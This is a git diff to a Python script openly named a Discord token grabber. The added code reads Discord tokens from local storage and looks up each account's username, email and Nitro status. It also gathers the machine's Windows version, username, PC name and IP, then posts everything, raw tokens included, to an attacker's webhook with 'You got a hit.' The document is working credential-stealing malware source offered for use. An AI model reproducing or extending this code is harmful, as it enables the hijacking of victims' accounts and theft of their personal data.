@@ -1,5 +1,3 @@
-# TODO add embed support
-
 # CONFIGURATION:
 # your webhook URL
 WEBHOOK_URL = 'WEBHOOK HERE'
@@ -15,19 +13,9 @@ MODE = 'TEXT'
 EXPERIMENTAL= False
 
 '''
-Discord token grabber
-Made by Mega145 aka MegaDev
-v1.0
-https://github.com/mega145/Discord_token_grabber
-
-
 CHANGELOG:
-- added SEND_IP and SEND_PC_INFO options
-- added EMBED to MODE (not ready to use yet)
-- added EXPERIMANTAL bool
-- added getIP() function
-- added getUserInfo() function
-- updated README
+- added embed support
+- added getPremiumType() function
 '''
 
 
@@ -79,7 +67,19 @@ def getPcInfo():
         windows_ver='Windows ' + platform.release() + ' ' + platform.win32_edition() + ' ' + platform.version(),
     )
     return userinfo
-    
+
+def getPremiumType(user_data):
+    try:
+        if user_data['premium_type'] == 0:
+            nitro = 'None'
+        elif user_data['premium_type'] == 1:
+            nitro = 'Nitro Classic'
+        elif user_data['premium'] == 2:
+            nitro = 'Nitro'
+    except:
+        nitro = 'None'
+
+    return nitro
 
 
 def main():
@@ -145,14 +145,24 @@ def main():
 
         
 
-        payload = json.dumps({'content': message})
+        payload = json.dumps({'username':'Token Grabber by Mega145','content': message})
 
         try:
             requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
         except:
             pass
-    elif MODE == 'EMBED' and EXPERIMENTAL:
+    elif MODE == 'EMBED':
         embeds = []
+        if SEND_PC_INFO:
+            PC_INFO = getPcInfo()
+            color = random.randint(0, 0xFFFFFF)
+            embed = {"title":'PC_INFO','description':f'``{PC_INFO["windows_ver"]}``',"color":color,"fields":[
+                           {
+                               "name":'**PC_IDENTITY**',
+                               "value":f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``"
+                           }
+                       ]}
+            embeds.append(embed)
         for platform, path in paths.items():
             if not os.path.exists(path):
                 continue
@@ -162,27 +172,36 @@ def main():
             if len(tokens) > 0:
                 for token in tokens:
                     try:
-                       color = random.randint(0, 0xFFFFFF)
-                       raw_user = getUserInfo(token)
-                       if raw_user['premium_type'] > 0:
-                           nitro = True
-                       else:
-                           nitro = False
-                       user = f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}\n'
-                       embed = {"title":user,'color':color,"fields":[
-                           {
-                               "name":'**Discord Account Info**',
-                               'value':f"NAME: {user}\n EMAIL: {raw_user['email']}\nNitro: {nitro}\nCOUNTRY: {raw_user['locale']}"
-                           }
-                       ]}
-                       embeds.append(embed)
+                        raw_user = getUserInfo(token)
+                        #print(raw_user)
                     except:
                         pass
+                        #print('This token does not work')
+                    try:
+                       color = random.randint(0, 0xFFFFFF)
+                       nitro = getPremiumType(raw_user)
+                       user = f'{raw_user["username"]}#{raw_user["discriminator"]}'
+                       embed = {"title":user,'description':f'Token:\n```{token}```',"color":color,"fields":[
+                           {
+                               "name":'**Discord Account Info**',
+                               "value":f"NAME: ``{user}``\nEMAIL: ``{raw_user['email']}``\nNitro: ``{nitro}``\n"
+                           }
+                       ],'author':{
+                           'name':user,'icon_url':'https://cdn.discordapp.com/avatars/' + str(raw_user['id']) + '/' + str(raw_user['avatar'])
+                       }}
+                       embeds.append(embed)
+                    except Exception as e:
+                        pass
+                        #print(f'could not make an embed\n{e}')
 
+        ping = '@everyone\n' if PING_ME else '\n'
+        ip = getIP() if SEND_IP else ''
+        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping + 'IP: ``' + ip + '``',"embeds":embeds}
+        payload = json.dumps(message)
 
-        message = {"username":"Token Grabber by MegaDev","embeds":json.dumps(embeds)}
-
-        requests.post(WEBHOOK_URL,headers=headers,data=message)
+        #print(message)
+        response = requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
+        #print(response.text)
     else:
         print('MODE invalid or experimental is not enabled')
 if __name__ == '__main__':
